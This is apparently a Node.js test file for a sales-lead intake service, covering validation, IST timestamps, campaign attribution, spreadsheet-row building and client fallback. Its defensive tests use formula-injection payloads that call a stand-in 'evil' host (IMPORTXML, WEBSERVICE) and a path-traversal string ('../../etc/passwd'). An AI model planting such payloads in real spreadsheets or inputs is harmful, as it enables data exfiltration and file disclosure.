import test from "node:test";
import assert from "node:assert/strict";
import {
  validateLead, makeLeadId, istTimestamp, safeCell, phoneCell, utmFrom,
  acquisitionSource, toSheetRow, LEAD_COLUMNS, ENQUIRY_LABEL,
} from "../src/lib/lead-server.js";
import { submitLead } from "../src/lib/lead-client.js";

const jsonHeaders = { get: (k) => (k.toLowerCase() === "content-type" ? "application/json" : null) };
const htmlHeaders = { get: (k) => (k.toLowerCase() === "content-type" ? "text/html" : null) };
const base = { name: "Ankur", phone: "9812345678", intent: "demo_request" };

// ── Spreadsheet safety ──────────────────────────────────────────────────────
test("a formula typed into a form is written as text, not executed", () => {
  for (const attack of ["=IMPORTXML(\"http://evil\",\"//a\")", "+1+1", "-1+1", "@SUM(A1:A9)"]) {
    assert.ok(safeCell(attack).startsWith("'"), attack);
  }
});

test("ordinary text is not mangled", () => {
  assert.equal(safeCell("ABC MEP Contractors"), "ABC MEP Contractors");
  assert.equal(safeCell("Sharma & Sons #2"), "Sharma & Sons #2");
  assert.equal(safeCell(""), "");
  assert.equal(safeCell(undefined), "");
});

test("phone numbers survive as text, keeping leading zeros and plus signs", () => {
  assert.equal(phoneCell("09812345678"), "'09812345678");
  assert.equal(phoneCell("+91 98123 45678"), "'+91 98123 45678");
  assert.equal(phoneCell(""), "");
});

// ── Validation is the real gate ─────────────────────────────────────────────
test("name and phone are required", () => {
  assert.deepEqual(validateLead({ phone: "9812345678" }).errors, ["name_required"]);
  assert.deepEqual(validateLead({ name: "A" }).errors, ["phone_required"]);
});

test("an implausible phone or email is refused", () => {
  assert.ok(validateLead({ name: "A", phone: "not-a-phone" }).errors.includes("phone_invalid"));
  assert.ok(validateLead({ ...base, email: "nope" }).errors.includes("email_invalid"));
  assert.ok(validateLead({ ...base, email: "a@b.co" }).ok);
});

test("a honeypot hit is flagged so it can be silently ignored", () => {
  assert.ok(validateLead({ ...base, website: "spam" }).errors.includes("honeypot"));
  assert.ok(validateLead({ ...base, website_hp: "spam" }).errors.includes("honeypot"));
});

test("oversized input is clamped, not rejected", () => {
  const r = validateLead({ ...base, company: "x".repeat(500), context: "y".repeat(5000) });
  assert.ok(r.ok);
  assert.equal(r.lead.company.length, 160);
  assert.equal(r.lead.context.length, 2000);
});

test("an unknown intent degrades instead of storing nonsense", () => {
  assert.equal(validateLead({ ...base, intent: "../../etc/passwd" }).lead.intent, "resource_request");
});

test("only a webinar registration keeps an event name", () => {
  assert.equal(validateLead({ ...base, intent: "diagnostic_request", event: "Masterclass" }).lead.event, "");
  assert.equal(validateLead({ ...base, intent: "webinar_registration", event: "Masterclass" }).lead.event, "Masterclass");
});

test("test submissions are flagged from the label alone", () => {
  assert.equal(validateLead({ ...base, name: "SOTYN WEBSITE TEST — IGNORE" }).lead.isTest, true);
  assert.equal(validateLead({ ...base, is_test: true }).lead.isTest, true);
  assert.equal(validateLead(base).lead.isTest, false);
});

// ── Identity and time ───────────────────────────────────────────────────────
test("lead ids are dated in IST and unique", () => {
  const id = makeLeadId(new Date("2026-09-23T19:30:00Z")); // 01:00 IST on the 24th
  assert.match(id, /^SOTYN-20260924-[0-9A-Z]{6}$/);
  const ids = new Set(Array.from({ length: 200 }, () => makeLeadId()));
  assert.ok(ids.size > 195, `only ${ids.size} unique`);
});

test("received time is IST, not UTC", () => {
  assert.equal(istTimestamp(new Date("2026-09-23T10:12:07Z")), "2026-09-23 15:42:07 IST");
});

// ── Attribution ─────────────────────────────────────────────────────────────
test("only permitted campaign parameters are kept", () => {
  const utm = utmFrom("?utm_source=google&utm_medium=cpc&utm_campaign=epc&phone=9812345678&email=a@b.co");
  assert.equal(utm.utm_source, "google");
  assert.equal(utm.utm_medium, "cpc");
  assert.equal(Object.keys(utm).length, 5);
  assert.ok(!JSON.stringify(utm).includes("9812345678"), "private parameters must not be retained");
});

test("a Google Ads click is attributed even without a utm_source", () => {
  assert.equal(utmFrom("?gclid=abc123").utm_source, "google-ads");
});

test("acquisition source is derived from the referrer when there is no campaign", () => {
  assert.equal(acquisitionSource("https://www.google.com/search?q=epc+erp", {}), "google-organic");
  assert.equal(acquisitionSource("", {}), "direct");
  assert.equal(acquisitionSource("https://www.sotyn.ai/pricing", {}), "internal");
  assert.equal(acquisitionSource("https://news.example.com/x", {}), "news.example.com");
  assert.equal(acquisitionSource("https://www.google.com/", { utm_source: "meta" }), "meta");
});

// ── The sheet row ───────────────────────────────────────────────────────────
function row(overrides = {}) {
  const { lead } = validateLead({ ...base, company: "ABC MEP", city: "Ludhiana", trade: "Solar EPC", ...overrides });
  return toSheetRow({ leadId: "SOTYN-20260923-ABC123", lead, receivedAt: "2026-09-23 15:42:07 IST", utm: utmFrom(lead.landingSearch), erpRef: "7", erpSync: "ok", owner: "Sales" });
}

test("the row matches the Leads tab, column for column", () => {
  assert.equal(row().length, LEAD_COLUMNS.length);
});

test("the enquiry type is the human label, and a diagnostic is never a webinar", () => {
  assert.equal(row({ intent: "diagnostic_request" })[LEAD_COLUMNS.indexOf("Enquiry type")], ENQUIRY_LABEL.diagnostic_request);
  assert.ok(!row({ intent: "diagnostic_request" }).join("|").toLowerCase().includes("masterclass"));
});

test("test rows are marked so business totals can exclude them", () => {
  const r = row({ name: "SOTYN WEBSITE TEST — IGNORE" });
  assert.equal(r[LEAD_COLUMNS.indexOf("Is test")], "TRUE");
  assert.equal(r[LEAD_COLUMNS.indexOf("Status")], "Test");
  assert.equal(row()[LEAD_COLUMNS.indexOf("Is test")], "FALSE");
});

test("the ERP reference and both sync states are recorded per destination", () => {
  const r = row();
  assert.equal(r[LEAD_COLUMNS.indexOf("ERP reference")], "7");
  assert.equal(r[LEAD_COLUMNS.indexOf("ERP sync")], "ok");
  assert.equal(r[LEAD_COLUMNS.indexOf("Sheet sync")], "ok");
});

test("a demo request arrives with its demo status already set", () => {
  assert.equal(row({ intent: "demo_request" })[LEAD_COLUMNS.indexOf("Demo status")], "Requested");
  assert.equal(row({ intent: "resource_request" })[LEAD_COLUMNS.indexOf("Demo status")], "");
});

test("a formula in the company name cannot reach the sheet live", () => {
  const r = row({ company: "=WEBSERVICE(\"http://evil\")" });
  assert.ok(String(r[LEAD_COLUMNS.indexOf("Company")]).startsWith("'"));
});

// ── Client fallback: the intake must never make capture worse ───────────────
test("a missing /api/lead falls back to the ERP endpoint", async () => {
  const calls = [];
  const fetchImpl = async (url) => {
    calls.push(url);
    if (url === "/api/lead") return { ok: false, status: 404, headers: jsonHeaders, text: async () => "{}" };
    return { ok: true, status: 200, headers: jsonHeaders, text: async () => '{"ok":true,"id":9}' };
  };
  const r = await submitLead("/api/lead", { name: "A" }, { requestId: "r1", fetchImpl, fallbackEndpoint: "https://erp.test/hook" });
  assert.equal(r.accepted, true);
  assert.deepEqual(calls, ["/api/lead", "https://erp.test/hook"]);
});

test("an HTML 200 from the intake also falls back", async () => {
  const calls = [];
  const fetchImpl = async (url) => {
    calls.push(url);
    if (url === "/api/lead") return { ok: true, status: 200, headers: htmlHeaders, text: async () => "<html>" };
    return { ok: true, status: 200, headers: jsonHeaders, text: async () => '{"ok":true}' };
  };
  assert.equal((await submitLead("/api/lead", {}, { requestId: "r2", fetchImpl, fallbackEndpoint: "https://erp.test/hook" })).accepted, true);
  assert.equal(calls.length, 2);
});

test("a refusal by the intake is NOT retried against the ERP", async () => {
  const calls = [];
  const fetchImpl = async (url) => {
    calls.push(url);
    return { ok: false, status: 422, headers: jsonHeaders, text: async () => '{"ok":false,"error":"validation_failed"}' };
  };
  const r = await submitLead("/api/lead", {}, { requestId: "r3", fetchImpl, fallbackEndpoint: "https://erp.test/hook" });
  assert.equal(r.accepted, false);
  assert.deepEqual(calls, ["/api/lead"], "a rejected lead must not be re-sent elsewhere");
});

test("both destinations failing is still a failure, never a false success", async () => {
  const fetchImpl = async () => ({ ok: false, status: 502, headers: jsonHeaders, text: async () => "{}" });
  const r = await submitLead("/api/lead", {}, { requestId: "r4", fetchImpl, fallbackEndpoint: "https://erp.test/hook" });
  assert.equal(r.accepted, false);
});

// ── First-touch attribution (fixes: referrer written into "Landing page",
//    and Google → internal page → demo being recorded as "internal") ────────
test("the landing page column holds the first page of the visit, not the referrer", () => {
  const { lead } = validateLead({
    ...base,
    page: "/demo",
    referrer: "https://www.sotyn.ai/construction-procurement-software",
    firstLanding: "/construction-procurement-software",
    firstReferrer: "https://www.google.com/",
  });
  const r = toSheetRow({ leadId: "X", lead, receivedAt: "t", utm: utmFrom(lead.firstSearch) });
  assert.equal(r[LEAD_COLUMNS.indexOf("Landing page")], "/construction-procurement-software");
  assert.equal(r[LEAD_COLUMNS.indexOf("Submission page")], "/demo");
  assert.ok(!String(r[LEAD_COLUMNS.indexOf("Landing page")]).startsWith("http"), "a referrer URL is not a landing page");
});

test("an external source survives internal navigation", () => {
  const { lead } = validateLead({
    ...base,
    page: "/demo",
    referrer: "https://www.sotyn.ai/pricing", // where they came from last
    firstReferrer: "https://www.google.com/search?q=ra+billing+software",
  });
  const r = toSheetRow({ leadId: "X", lead, receivedAt: "t", utm: {} });
  assert.equal(r[LEAD_COLUMNS.indexOf("Acquisition source")], "google-organic",
    "the visit's real source must not be overwritten by the visitor's own navigation");
});

test("campaign parameters come from the first URL of the visit", () => {
  const { lead } = validateLead({
    ...base,
    landingSearch: "",                                  // the /demo URL had none
    firstSearch: "?utm_source=linkedin&utm_medium=post", // the entry URL did
  });
  const utm = utmFrom(lead.firstSearch || lead.landingSearch);
  assert.equal(utm.utm_source, "linkedin");
  const r = toSheetRow({ leadId: "X", lead, receivedAt: "t", utm });
  assert.equal(r[LEAD_COLUMNS.indexOf("Acquisition source")], "linkedin");
});

test("first-touch capture never throws when storage is unavailable", async () => {
  const { getFirstTouch } = await import("../src/lib/attribution.js");
  const prev = globalThis.sessionStorage;
  globalThis.sessionStorage = { getItem() { throw new Error("blocked"); }, setItem() { throw new Error("blocked"); } };
  assert.deepEqual(getFirstTouch(), {});
  if (prev === undefined) delete globalThis.sessionStorage; else globalThis.sessionStorage = prev;
});
